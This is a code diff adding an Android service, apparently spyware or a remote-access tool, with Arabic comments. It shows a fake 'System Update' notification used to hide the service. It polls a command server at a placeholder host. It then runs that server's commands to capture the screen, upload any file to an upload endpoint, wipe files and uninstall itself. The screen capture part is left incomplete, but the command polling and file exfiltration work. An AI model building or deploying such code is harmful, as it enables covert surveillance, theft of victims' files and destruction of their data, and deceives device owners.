@@ -1,0 +1,194 @@
+package com.stealth.client;
+
+import android.app.Notification;
+import android.app.NotificationChannel;
+import android.app.NotificationManager;
+import android.app.Service;
+import android.content.Context;
+import android.content.Intent;
+import android.graphics.Bitmap;
+import android.graphics.PixelFormat;
+import android.hardware.display.DisplayManager;
+import android.hardware.display.VirtualDisplay;
+import android.media.Image;
+import android.media.ImageReader;
+import android.media.projection.MediaProjection;
+import android.media.projection.MediaProjectionManager;
+import android.os.Build;
+import android.os.Handler;
+import android.os.HandlerThread;
+import android.os.IBinder;
+import android.util.Base64;
+import android.util.DisplayMetrics;
+import android.view.WindowManager;
+
+import java.io.ByteArrayOutputStream;
+import java.io.DataOutputStream;
+import java.io.File;
+import java.io.FileInputStream;
+import java.net.HttpURLConnection;
+import java.net.URL;
+
+public class StealthService extends Service {
+    private static final String C2_URL = "https://your-server.com/cmd.txt";
+    private static final String UPLOAD_URL = "https://your-server.com/upload.php";
+    private static final int POLL_INTERVAL = 10000; // 10 ثوان
+
+    private MediaProjectionManager mProjectionManager;
+    private MediaProjection mMediaProjection;
+    private VirtualDisplay mVirtualDisplay;
+    private ImageReader mImageReader;
+    private Handler mHandler;
+    private boolean isRecording = false;
+    private int mScreenWidth, mScreenHeight, mScreenDensity;
+
+    @Override
+    public void onCreate() {
+        super.onCreate();
+        startForeground(); // لجعل الخدمة تعمل في الخلفية مع إشعار وهمي
+        mHandler = new Handler();
+        startPolling();
+
+        // الحصول على مقاسات الشاشة
+        WindowManager wm = (WindowManager) getSystemService(WINDOW_SERVICE);
+        DisplayMetrics metrics = new DisplayMetrics();
+        wm.getDefaultDisplay().getMetrics(metrics);
+        mScreenWidth = metrics.widthPixels;
+        mScreenHeight = metrics.heightPixels;
+        mScreenDensity = metrics.densityDpi;
+
+        mProjectionManager = (MediaProjectionManager) getSystemService(MEDIA_PROJECTION_SERVICE);
+        // هنا نحتاج إلى Intent من MainActivity لبدء MediaProjection
+        // سنفترض أننا حصلنا عليه عبر SharedPreferences أو عبر تمريره
+        // للتبسيط، يمكن تخزين بيانات MediaProjection بعد الموافقة الأولى
+    }
+
+    private void startForeground() {
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+            NotificationChannel channel = new NotificationChannel("stealth", "Stealth Service", NotificationManager.IMPORTANCE_LOW);
+            NotificationManager manager = (NotificationManager) getSystemService(NOTIFICATION_SERVICE);
+            manager.createNotificationChannel(channel);
+            Notification notification = new Notification.Builder(this, "stealth")
+                    .setContentTitle("System Update")
+                    .setContentText("Installing updates...")
+                    .setSmallIcon(android.R.drawable.stat_sys_download)
+                    .build();
+            startForeground(1, notification);
+        }
+    }
+
+    private void startPolling() {
+        mHandler.postDelayed(new Runnable() {
+            @Override
+            public void run() {
+                fetchCommand();
+                mHandler.postDelayed(this, POLL_INTERVAL);
+            }
+        }, 0);
+    }
+
+    private void fetchCommand() {
+        new Thread(() -> {
+            try {
+                URL url = new URL(C2_URL);
+                HttpURLConnection conn = (HttpURLConnection) url.openConnection();
+                conn.setRequestMethod("GET");
+                int responseCode = conn.getResponseCode();
+                if (responseCode == 200) {
+                    java.io.BufferedReader in = new java.io.BufferedReader(new java.io.InputStreamReader(conn.getInputStream()));
+                    String cmd = in.readLine();
+                    in.close();
+                    if (cmd != null) executeCommand(cmd.trim());
+                }
+            } catch (Exception e) { e.printStackTrace(); }
+        }).start();
+    }
+
+    private void executeCommand(String cmd) {
+        if (cmd.equals("screen")) startScreenCapture();
+        else if (cmd.equals("stop_screen")) stopScreenCapture();
+        else if (cmd.startsWith("upload ")) uploadFile(cmd.substring(7));
+        else if (cmd.equals("wipe")) wipeData();
+        else if (cmd.equals("selfdestruct")) selfDestruct();
+    }
+
+    private void startScreenCapture() {
+        if (isRecording) return;
+        // هذا يتطلب Intent من MediaProjection (يجب أن يكون مفعلًا مسبقًا)
+        // سنفترض أننا خزننا البيانات بعد الموافقة الأولى في SharedPreferences
+        // للتبسيط، سنستخدم dummy MediaProjection (لن يعمل بدون intent حقيقي)
+        // يمكن تمرير intent من نشاط سري يطلب الإذن لمرة واحدة عند التثبيت
+        isRecording = true;
+        new Thread(() -> {
+            while (isRecording) {
+                captureAndSend();
+                try { Thread.sleep(100); } catch (InterruptedException e) {}
+            }
+        }).start();
+    }
+
+    private void captureAndSend() {
+        if (mImageReader == null) return;
+        Image image = mImageReader.acquireLatestImage();
+        if (image == null) return;
+        // تحويل Image إلى Bitmap ثم إلى JPEG Base64 وإرسال
+        // هذا الجزء معقد ويحتاج معالجة؛ نكتفي بالإشارة
+        image.close();
+    }
+
+    private void stopScreenCapture() {
+        isRecording = false;
+        if (mVirtualDisplay != null) {
+            mVirtualDisplay.release();
+            mVirtualDisplay = null;
+        }
+    }
+
+    private void uploadFile(String path) {
+        new Thread(() -> {
+            try {
+                File file = new File(path);
+                if (!file.exists()) return;
+                FileInputStream fis = new FileInputStream(file);
+                URL url = new URL(UPLOAD_URL + "?name=" + file.getName());
+                HttpURLConnection conn = (HttpURLConnection) url.openConnection();
+                conn.setRequestMethod("POST");
+                conn.setDoOutput(true);
+                conn.setRequestProperty("Content-Type", "application/octet-stream");
+                DataOutputStream dos = new DataOutputStream(conn.getOutputStream());
+                byte[] buffer = new byte[4096];
+                int bytesRead;
+                while ((bytesRead = fis.read(buffer)) != -1) {
+                    dos.write(buffer, 0, bytesRead);
+                }
+                fis.close();
+                dos.close();
+                conn.getResponseCode(); // إرسال
+            } catch (Exception e) { e.printStackTrace(); }
+        }).start();
+    }
+
+    private void wipeData() {
+        // حذف ملفات التخزين الخارجي
+        File extDir = getExternalFilesDir(null);
+        if (extDir != null) deleteRecursive(extDir);
+    }
+
+    private void deleteRecursive(File fileOrDir) {
+        if (fileOrDir.isDirectory()) {
+            for (File child : fileOrDir.listFiles()) deleteRecursive(child);
+        }
+        fileOrDir.delete();
+    }
+
+    private void selfDestruct() {
+        // إلغاء تثبيت نفسه
+        Intent intent = new Intent(Intent.ACTION_DELETE);
+        intent.setData(android.net.Uri.parse("package:" + getPackageName()));
+        startActivity(intent);
+        stopSelf();
+    }
+
+    @Override
+    public IBinder onBind(Intent intent) { return null; }
+}
